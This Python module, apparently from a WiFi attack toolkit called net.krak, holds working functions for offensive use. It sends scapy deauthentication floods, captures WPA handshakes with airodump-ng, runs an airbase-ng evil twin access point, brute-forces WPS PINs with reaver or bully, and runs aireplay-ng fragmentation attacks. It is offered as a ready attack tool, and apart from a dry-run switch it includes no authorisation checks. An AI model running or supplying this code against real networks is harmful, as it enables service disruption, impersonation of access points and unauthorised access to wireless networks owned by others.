"""
attacks.py - Hardened WiFi attack logic for net.krak
Enhanced with better error handling, validation, and security measures
"""
import logging
import subprocess
import shutil
import time
import threading
import signal
import os
try:
    import psutil
except ImportError:
    psutil = None
from pathlib import Path
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
from scapy.sendrecv import sendp
from scapy.all import sniff, get_if_list
import json

class AttackManager:
    """Centralized attack management with process tracking and cleanup"""
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger("attacks")
        self.active_processes = {}
        self.attack_status = {}
        self.lock = threading.Lock()
        
    def _validate_interface(self, interface):
        """Validate that the interface exists and is in monitor mode"""
        try:
            if interface not in get_if_list():
                raise ValueError(f"Interface {interface} not found")
            
            # Check if interface is in monitor mode
            result = subprocess.run(
                ["iwconfig", interface], 
                capture_output=True, 
                text=True, 
                timeout=5
            )
            if "Mode:Monitor" not in result.stdout:
                raise ValueError(f"Interface {interface} is not in monitor mode")
            return True
        except subprocess.TimeoutExpired:
            raise ValueError(f"Timeout checking interface {interface}")
        except Exception as e:
            raise ValueError(f"Interface validation failed: {e}")
    
    def _validate_mac_address(self, mac):
        """Validate MAC address format"""
        import re
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        if not re.match(mac_pattern, mac):
            raise ValueError(f"Invalid MAC address format: {mac}")
        return True
    
    def _validate_channel(self, channel):
        """Validate WiFi channel number"""
        if not isinstance(channel, int) or not (1 <= channel <= 165):
            raise ValueError(f"Invalid channel number: {channel}. Must be 1-165")
        return True
    
    def _log_attack_event(self, event_type, **kwargs):
        """Log attack events with structured data"""
        event_data = {
            "timestamp": time.time(),
            "event_type": event_type,
            "pid": os.getpid(),
            **kwargs
        }
        self.logger.info(json.dumps(event_data))
    
    def _cleanup_process(self, process_id):
        """Safely cleanup a process"""
        with self.lock:
            if process_id in self.active_processes:
                process = self.active_processes[process_id]
                try:
                    if process.poll() is None:  # Process is still running
                        process.terminate()
                        time.sleep(1)
                        if process.poll() is None:  # Still running
                            process.kill()
                    self.active_processes.pop(process_id, None)
                    self.attack_status.pop(process_id, None)
                    self._log_attack_event("process_cleaned", process_id=process_id)
                except Exception as e:
                    self.logger.error(f"Error cleaning up process {process_id}: {e}")
    
    def cleanup_all_processes(self):
        """Cleanup all active processes"""
        with self.lock:
            for process_id in list(self.active_processes.keys()):
                self._cleanup_process(process_id)
    
    def get_attack_status(self):
        """Get status of all active attacks"""
        with self.lock:
            return dict(self.attack_status)

# Global attack manager instance
attack_manager = AttackManager()

def deauth_attack(interface, target_bssid, packet_count=10, dry_run=False, logger=None, 
                 target_client='ff:ff:ff:ff:ff:ff', interval=0.1):
    """
    Enhanced deauthentication attack with better validation and error handling
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target access point
        packet_count: Number of deauth packets to send
        dry_run: If True, only simulate the attack
        logger: Logger instance
        target_client: Target client MAC (default: broadcast)
        interval: Interval between packets in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        attack_manager._validate_mac_address(target_client)
        
        if not isinstance(packet_count, int) or packet_count <= 0:
            raise ValueError("Packet count must be a positive integer")
        
        if dry_run:
            logger.info(f"[DRY RUN] Would send {packet_count} deauth packets to {target_bssid} on {interface}")
            attack_manager._log_attack_event("deauth_dry_run", 
                                           interface=interface, 
                                           target_bssid=target_bssid,
                                           packet_count=packet_count)
            return True
        
        # Create deauth packet
        dot11 = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        
        # Send packets with progress tracking
        logger.info(f"Starting deauth attack: {packet_count} packets to {target_bssid}")
        attack_manager._log_attack_event("deauth_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       packet_count=packet_count)
        
        start_time = time.time()
        sendp(packet, iface=interface, count=packet_count, inter=interval, verbose=False)
        duration = time.time() - start_time
        
        logger.info(f"Deauth attack completed: {packet_count} packets sent in {duration:.2f}s")
        attack_manager._log_attack_event("deauth_complete", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       duration=duration)
        return True
        
    except Exception as e:
        logger.error(f"Deauth attack failed: {e}")
        attack_manager._log_attack_event("deauth_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def run_external_tool(cmd_args, dry_run=False, logger=None, timeout=300, capture_output=True):
    """
    Enhanced external tool execution with better process management
    
    Args:
        cmd_args: Command and arguments list
        dry_run: If True, only simulate execution
        logger: Logger instance
        timeout: Process timeout in seconds
        capture_output: Whether to capture stdout/stderr
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate command
        if not cmd_args or not isinstance(cmd_args, list):
            raise ValueError("Command arguments must be a non-empty list")
        
        tool_name = cmd_args[0]
        if shutil.which(tool_name) is None:
            raise FileNotFoundError(f"Required tool '{tool_name}' not found in PATH")
        
        if dry_run:
            logger.info(f"[DRY RUN] Would run: {' '.join(cmd_args)}")
            attack_manager._log_attack_event("external_tool_dry_run", command=cmd_args)
            return "DRY_RUN_PROCESS"
        
        # Start process with proper error handling
        process = subprocess.Popen(
            cmd_args, 
            stdout=subprocess.PIPE if capture_output else None,
            stderr=subprocess.PIPE if capture_output else None, 
            text=True,
            preexec_fn=os.setsid  # Create new process group
        )
        
        process_id = str(process.pid)
        with attack_manager.lock:
            attack_manager.active_processes[process_id] = process
            attack_manager.attack_status[process_id] = {
                "command": cmd_args,
                "start_time": time.time(),
                "status": "running"
            }
        
        logger.info(f"Started process: {' '.join(cmd_args)} (PID {process.pid})")
        attack_manager._log_attack_event("external_tool_start", 
                                       command=cmd_args, 
                                       process_id=process_id)
        
        return process
        
    except FileNotFoundError as e:
        logger.error(f"Command '{cmd_args[0]}' not found: {e}")
        attack_manager._log_attack_event("external_tool_error", 
                                       command=cmd_args, 
                                       error=str(e))
        return None
    except Exception as e:
        logger.error(f"Failed to start process {' '.join(cmd_args)}: {e}")
        attack_manager._log_attack_event("external_tool_error", 
                                       command=cmd_args, 
                                       error=str(e))
        return None

def capture_handshake(interface, bssid, channel=None, output_prefix="handshake", 
                     dry_run=False, logger=None, duration=300):
    """
    Enhanced handshake capture with better process management
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        channel: WiFi channel (optional)
        output_prefix: Output file prefix
        dry_run: If True, only simulate capture
        logger: Logger instance
        duration: Capture duration in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        logger.info(f"Starting handshake capture on {bssid} (channel: {channel or 'auto'})")
        attack_manager._log_attack_event("handshake_capture_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(duration)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Handshake capture timed out after {duration}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Handshake capture failed: {e}")
        attack_manager._log_attack_event("handshake_capture_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_evil_twin(interface, bssid, ssid, dry_run=False, logger=None, 
                     channel=None, hidden=False):
    """
    Enhanced evil twin attack with better configuration options
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID to spoof
        ssid: SSID to broadcast
        dry_run: If True, only simulate attack
        logger: Logger instance
        channel: WiFi channel (optional)
        hidden: Whether to create hidden network
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if not ssid or not isinstance(ssid, str):
            raise ValueError("SSID must be a non-empty string")
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airbase-ng", "-a", bssid, "-e", ssid, "--essid", ssid, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        if hidden:
            cmd.append("--hidden")
        
        logger.info(f"Starting evil twin attack: {ssid} ({bssid})")
        attack_manager._log_attack_event("evil_twin_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       ssid=ssid,
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        return process
        
    except Exception as e:
        logger.error(f"Evil twin attack failed: {e}")
        attack_manager._log_attack_event("evil_twin_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       ssid=ssid,
                                       error=str(e))
        return None

def capture_credentials(interface, bssid, channel=None, output_prefix="captured_creds", 
                      dry_run=False, logger=None, duration=600):
    """
    Enhanced credential capture with better monitoring
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        channel: WiFi channel (optional)
        output_prefix: Output file prefix
        dry_run: If True, only simulate capture
        logger: Logger instance
        duration: Capture duration in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        logger.info(f"Starting credential capture on {bssid} (channel: {channel or 'auto'})")
        attack_manager._log_attack_event("credential_capture_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(duration)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Credential capture timed out after {duration}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Credential capture failed: {e}")
        attack_manager._log_attack_event("credential_capture_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_wps_attack(interface, bssid, dry_run=False, logger=None, timeout=300):
    """
    Perform WPS PIN attack using reaver or bully
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        dry_run: If True, only simulate attack
        logger: Logger instance
        timeout: Attack timeout in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        # Try reaver first, then bully
        tools = ["reaver", "bully"]
        cmd = None
        
        for tool in tools:
            if shutil.which(tool):
                if tool == "reaver":
                    cmd = ["reaver", "-i", interface, "-b", bssid, "-vv", "-L", "-N", "-d", "15", "-T", "0.5", "-r", "3:15"]
                elif tool == "bully":
                    cmd = ["bully", interface, "-b", bssid, "-v", "3"]
                break
        
        if not cmd:
            raise FileNotFoundError("Neither reaver nor bully found in PATH")
        
        logger.info(f"Starting WPS attack on {bssid} using {cmd[0]}")
        attack_manager._log_attack_event("wps_attack_start", 
                                       interface=interface, 
                                       bssid=bssid,
                                       tool=cmd[0])
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(timeout)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"WPS attack timed out after {timeout}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"WPS attack failed: {e}")
        attack_manager._log_attack_event("wps_attack_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_fragmentation_attack(interface, bssid, dry_run=False, logger=None, timeout=300):
    """
    Perform fragmentation attack using aireplay-ng
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        dry_run: If True, only simulate attack
        logger: Logger instance
        timeout: Attack timeout in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        cmd = ["aireplay-ng", "-5", "-b", bssid, interface]
        
        logger.info(f"Starting fragmentation attack on {bssid}")
        attack_manager._log_attack_event("fragmentation_attack_start", 
                                       interface=interface, 
                                       bssid=bssid)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(timeout)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Fragmentation attack timed out after {timeout}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Fragmentation attack failed: {e}")
        attack_manager._log_attack_event("fragmentation_attack_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def stop_attack(process_id, logger=None):
    """
    Stop a specific attack process
    
    Args:
        process_id: Process ID to stop
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        attack_manager._cleanup_process(process_id)
        logger.info(f"Stopped attack process {process_id}")
        attack_manager._log_attack_event("attack_stopped", process_id=process_id)
        return True
    except Exception as e:
        logger.error(f"Failed to stop attack process {process_id}: {e}")
        return False

def stop_all_attacks(logger=None):
    """
    Stop all active attack processes
    
    Args:
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        attack_manager.cleanup_all_processes()
        logger.info("Stopped all attack processes")
        attack_manager._log_attack_event("all_attacks_stopped")
        return True
    except Exception as e:
        logger.error(f"Failed to stop all attacks: {e}")
        return False

def get_attack_status():
    """
    Get status of all active attacks
    
    Returns:
        dict: Status of all active attacks
    """
    return attack_manager.get_attack_status()

# Cleanup on module exit
import atexit
atexit.register(attack_manager.cleanup_all_processes)